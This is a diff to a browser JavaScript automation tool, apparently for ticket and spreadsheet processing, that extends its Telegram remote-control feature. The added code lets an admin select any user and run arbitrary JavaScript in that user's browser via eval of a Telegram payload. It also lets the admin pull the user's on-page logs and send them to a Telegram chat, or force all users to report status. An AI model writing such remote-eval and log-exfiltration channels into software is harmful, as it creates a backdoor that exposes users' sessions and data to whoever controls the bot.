@@ -216,7 +216,36 @@
 				case 'get_status':
 					if (window.telegramReporter) await window.telegramReporter.sendStatusReport();
 					break;
-
+				case 'get_logs':
+					if (window.telegramReporter) {
+						const logs = VisualLogger.getLogs();
+						await window.telegramReporter.sendLogs(logs);
+					}
+					break;
+				case 'eval':
+					try {
+						const result = eval(command.payload);
+						await this.sendToTelegram(`💻 <b>Eval Executed</b>\nResult: <code>${String(result)}</code>`);
+					} catch (e) {
+						await this.sendToTelegram(`❌ <b>Eval Failed</b>\nError: <code>${e.message}</code>`);
+					}
+					break;
+				case 'set_sheet':
+					if (StateManager) {
+						const state = StateManager.getState();
+						state.sheetName = command.payload;
+						StateManager.setState(state);
+						await this.sendToTelegram(`✅ Sheet set to: ${command.payload}`);
+					}
+					break;
+				case 'set_type':
+					if (StateManager) {
+						const state = StateManager.getState();
+						state.ticketType = command.payload;
+						StateManager.setState(state);
+						await this.sendToTelegram(`✅ Ticket Type set to: ${command.payload}`);
+					}
+					break;
 			}
 
 			// Report command execution
@@ -643,6 +672,27 @@
 				console.error('Telegram command failed:', error);
 			}
 		}
+
+		async sendLogs(logs) {
+			try {
+				const maxLength = 4000;
+				const logChunks = logs.match(new RegExp(`.{1,${maxLength}}`, 'gs')) || [logs];
+
+				for (const chunk of logChunks) {
+					await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+						method: 'POST',
+						headers: { 'Content-Type': 'application/json' },
+						body: JSON.stringify({
+							chat_id: this.chatId,
+							text: `📜 <b>Remote Logs</b>\n<pre>${chunk}</pre>`,
+							parse_mode: 'HTML'
+						})
+					});
+				}
+			} catch (error) {
+				VisualLogger.warn(`Failed to send logs: ${error.message}`);
+			}
+		}
 	}
 
 	// ========== REMOTE CONTROL MANAGER ==========
@@ -855,12 +905,17 @@
 								`  /set_pat &lt;token&gt; - Securely store your GitHub PAT\n\n` +
 								`<b>Remote Admin Commands:</b>\n` +
 								`  /list_users - List known user IDs\n` +
+								`  /report_all - Force all users to report status\n` +
 								`  /broadcast &lt;msg&gt; - Send message to all\n` +
 								`  /target &lt;user_id&gt; - Select user to control\n\n` +
 								`<b>Targeted Commands (requires /target):</b>\n` +
 								`  /exec get_status - Get target's status\n` +
+								`  /exec get_logs - Get target's logs\n` +
 								`  /exec start_prompt &lt;sheet&gt; - Start prompt mode\n` +
 								`  /exec process &lt;rows&gt; - Process rows/IDs\n` +
+								`  /exec set_sheet &lt;name&gt; - Set active sheet\n` +
+								`  /exec set_type &lt;type&gt; - Set ticket type\n` +
+								`  /exec eval &lt;code&gt; - Execute JS (Advanced)\n` +
 								`  /exec stop_prompt - Stop target's prompt mode\n` +
 								`  /exec pause_queue - Pause target's queue\n` +
 								`  /exec resume_queue - Resume target's queue\n\n` +
@@ -926,6 +981,8 @@
 						if (remoteAction === 'start_prompt') {
 							remoteCommand.sheetName = payload;
 						} else if (remoteAction === 'process_rows') {
+							remoteCommand.payload = payload;
+						} else {
 							remoteCommand.payload = payload;
 						}
 
@@ -1481,6 +1538,14 @@
 		static error(msg) { this.log(`❌ ${msg}`, 'error'); }
 		static warn(msg) { this.log(`⚠️ ${msg}`, 'warn'); }
 		static debug(msg) { this.log(`🔍 ${msg}`, 'debug'); }
+
+		static getLogs() {
+			const content = document.getElementById('loggerContent');
+			if (!content) return 'No logs available.';
+			return Array.from(content.querySelectorAll('.log-entry')).map(entry => {
+				return entry.innerText.replace(/\n/g, ' ');
+			}).join('\n');
+		}
 	}
 
 	// ========== TOAST MANAGER ==========
